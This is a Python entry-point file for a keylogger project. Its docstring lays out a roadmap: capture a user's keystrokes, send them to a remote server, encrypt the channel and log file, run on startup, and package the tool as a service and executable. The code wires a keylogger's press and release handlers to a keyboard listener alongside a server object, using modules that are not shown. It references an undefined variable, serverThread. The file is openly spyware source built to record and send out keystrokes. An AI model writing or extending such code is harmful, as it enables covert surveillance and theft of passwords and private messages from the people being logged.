from server import *
from keylogV2 import *
from threading import Thread, Lock

"""
Make a keylogger that takes the input of a user and sends it to
a remote server.

Version 0: Write the information on a text file on client.
Version 1: Send the to a remote client.
Version 2: Write the information on a file on a directory of the client.
Version 3: Encrypt the channel and the .txt file for security.
Version 4: Make the application run on startup.

Make a requirements.txt file and package the whole thing into a service at the end.
Make the program an executable.
"""

def main():

    lock = Lock()
    myServer = Server(lock)
    logger = Keylogger(lock)
    with Listener(on_press = logger.on_press, on_release = logger.on_release) as listener:
        listener.join()

    myServer.kill()
    serverThread.join()


if __name__ == "__main__":
    main()
